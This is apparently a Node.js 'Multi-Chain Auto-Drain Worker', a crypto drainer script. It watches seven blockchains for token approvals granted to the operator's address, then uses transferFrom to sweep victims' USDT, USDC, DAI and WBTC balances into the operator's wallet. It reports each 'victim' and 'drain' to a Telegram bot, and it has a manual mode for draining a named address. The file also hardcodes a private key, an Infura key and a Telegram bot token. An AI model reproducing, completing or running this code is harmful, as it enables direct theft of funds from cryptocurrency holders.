const { ethers } = require("ethers");

// --- CONFIGURATION ---
const RECEIVER_PRIVATE_KEY = "0x75f8501c64abf4320568ac8c274e5fe1f079fb0c6d6f2b92d0bd96fb671b120e";
const RECEIVER_ADDRESS = "0xa24337d9736F9A9eEc0Ca0859234B72A503Ab931";

// Multi-Chain RPC Configuration (Using your Infura endpoints)
const CHAIN_CONFIGS = {
    ethereum: {
        name: "Ethereum",
        rpcUrl: "wss://mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 1
    },
    bsc: {
        name: "BSC",
        rpcUrl: "wss://bsc-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 56
    },
    polygon: {
        name: "Polygon",
        rpcUrl: "wss://polygon-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 137
    },
    base: {
        name: "Base",
        rpcUrl: "wss://base-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 8453
    },
    arbitrum: {
        name: "Arbitrum",
        rpcUrl: "wss://arbitrum-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 42161
    },
    optimism: {
        name: "Optimism",
        rpcUrl: "wss://optimism-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 10
    },
    avalanche: {
        name: "Avalanche",
        rpcUrl: "wss://avalanche-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 43114
    }
};

// Target tokens (add chain-specific tokens as needed)
const TARGET_TOKENS = {
    ethereum: [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
    ],
    bsc: [
        "0x55d398326f99059fF775485246999027B3197955", // USDT (BSC)
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC (BSC)
    ],
    polygon: [
        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT (Polygon)
        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC (Polygon)
    ],
    // Add more chains as needed
};

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)",
    "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

// --- INTEGRATIONS ---
const TG_BOT_TOKEN = "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
const TG_CHAT_ID = "7772781858";

async function notifyTelegram(message) {
    if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
    try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
    } catch (e) {
        console.error("TG Notification failed", e.message);
    }
}

async function startMultiChainWorker() {
    console.log("🚀 Starting Multi-Chain Auto-Drain Worker...\n");

    const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY);
    console.log(`Receiver Address: ${wallet.address}\n`);

    await notifyTelegram(`<b>🤖 Worker Started</b>\nAddress: <code>${wallet.address}</code>\nChains: ${Object.keys(CHAIN_CONFIGS).join(", ")}`);

    // Start a listener for each chain
    for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
        startChainListener(chainKey, config, wallet);
    }

    console.log("✅ All chain listeners active. Waiting for approvals...\n");

    // Keep process alive
    setInterval(() => {
        const timestamp = new Date().toLocaleTimeString();
        console.log(`[${timestamp}] Worker active across ${Object.keys(CHAIN_CONFIGS).length} chains...`);
    }, 60000);
}

function startChainListener(chainKey, config, wallet) {
    const connect = () => {
        try {
            console.log(`🔗 Connecting to ${config.name}...`);
            const provider = new ethers.WebSocketProvider(config.rpcUrl);
            const connectedWallet = wallet.connect(provider);

            provider.on("error", (error) => {
                console.error(`❌ [${config.name}] WebSocket Error:`, error.message);
            });

            provider.websocket.on("close", (code) => {
                console.warn(`⚠️ [${config.name}] Connection closed (${code}). Reconnecting in 5s...`);
                setTimeout(connect, 5000);
            });

            const tokens = TARGET_TOKENS[chainKey] || [];
            tokens.forEach(tokenAddress => {
                const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                const filter = contract.filters.Approval(null, wallet.address);

                contract.on(filter, async (owner, spender, value) => {
                    console.log(`\n🎯 [${config.name}] APPROVAL DETECTED!`);
                    await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>\nValue: ${value.toString()}`);
                    await attemptDrain(connectedWallet, tokenAddress, owner, config.name);
                });
            });

            console.log(`   ✅ Listening on ${config.name}`);

        } catch (error) {
            console.error(`❌ Failed to connect to ${config.name}:`, error.message);
            setTimeout(connect, 10000);
        }
    };

    connect();
}

async function attemptDrain(wallet, tokenAddress, victimAddress, chainName) {
    try {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);

        const balance = await contract.balanceOf(victimAddress);
        if (balance === 0n) {
            console.log(`   ⚠️ Victim has 0 balance. Skipping.`);
            return;
        }

        const allowance = await contract.allowance(victimAddress, wallet.address);
        if (allowance === 0n) {
            console.log(`   ⚠️ False alarm: Allowance is 0.`);
            return;
        }

        const amountToSweep = balance > allowance ? allowance : balance;
        console.log(`   💰 Sweeping ${ethers.formatUnits(amountToSweep, 18)} tokens...`);

        const tx = await contract.transferFrom(victimAddress, wallet.address, amountToSweep);
        console.log(`   📤 Transaction sent: ${tx.hash}`);

        await notifyTelegram(`<b>💸 Drain Transaction Sent</b>\nChain: ${chainName}\nHash: <code>${tx.hash}</code>\nAmount: ${ethers.formatUnits(amountToSweep, 18)}`);

        await tx.wait();
        console.log(`   ✅ SUCCESS! Funds secured on ${chainName}.`);
        await notifyTelegram(`<b>💰 SUCCESS!</b>\nFunds secured from <code>${victimAddress}</code> on ${chainName}.`);

    } catch (error) {
        console.error(`   ❌ Drain failed on ${chainName}:`, error.message);
        await notifyTelegram(`<b>❌ Drain Failed</b>\nChain: ${chainName}\nError: <code>${error.message}</code>`);
    }
}

// Manual trigger mode (if you want to drain a specific address on a specific chain)
const args = process.argv.slice(2);
const targetArg = args.find(arg => arg.startsWith("--target="));
const chainArg = args.find(arg => arg.startsWith("--chain="));

if (targetArg) {
    const targetAddress = targetArg.split("=")[1];
    const chainKey = chainArg ? chainArg.split("=")[1] : "ethereum";

    console.log(`Manual Trigger Mode`);
    console.log(`Target: ${targetAddress}`);
    console.log(`Chain: ${chainKey}\n`);

    (async () => {
        const config = CHAIN_CONFIGS[chainKey];
        if (!config) {
            console.error(`Unknown chain: ${chainKey}`);
            return;
        }

        const provider = new ethers.JsonRpcProvider(config.rpcUrl.replace('wss://', 'https://').replace('/ws/', '/'));
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

        const tokens = TARGET_TOKENS[chainKey] || [];
        for (const token of tokens) {
            await attemptDrain(wallet, token, targetAddress, config.name);
        }
    })();
} else {
    // Start listening mode
    startMultiChainWorker().catch(console.error);
}
